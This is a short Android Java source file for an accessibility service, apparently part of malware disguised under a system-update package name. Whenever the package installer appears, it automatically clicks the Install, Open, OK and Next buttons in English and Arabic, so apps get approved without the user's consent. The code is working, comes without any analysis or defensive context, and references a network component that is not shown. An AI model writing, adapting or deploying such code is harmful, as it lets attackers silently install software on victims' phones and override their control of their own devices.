package com.system.update.core;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class AutoInstallerService extends AccessibilityService {

    private NetworkManager networkManager;

    @Override
    public void onCreate() {
        super.onCreate();
        networkManager = new NetworkManager();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;

        if (event.getPackageName().toString().contains("packageinstaller")) {
            clickTargetButtons();
        }
    }

    private void clickTargetButtons() {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        String[] targetTexts = {"Install", "تثبيت", "Open", "فتح", "OK", "موافق", "Next", "التالي"};

        for (String text : targetTexts) {
            List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(text);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (node.isEnabled() && node.isClickable()) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                }
            }
        }
        rootNode.recycle();
    }

    @Override
    public void onInterrupt() {}
}
